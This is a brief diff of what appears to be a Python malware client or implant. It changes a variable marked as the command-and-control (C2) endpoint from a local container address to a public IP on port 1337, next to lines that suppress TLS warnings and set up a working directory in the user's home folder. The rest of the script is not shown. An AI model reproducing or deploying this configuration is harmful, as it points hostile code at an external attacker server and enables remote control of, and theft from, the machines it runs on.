@@ -12,7 +12,7 @@ from urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 # C2 endpoint
-url = "http://172.17.0.1:1337/c2"
+url = "http://34.218.60.251:1337/c2"
 
 # Setup working directory
 home_directory = os.path.expanduser("~")
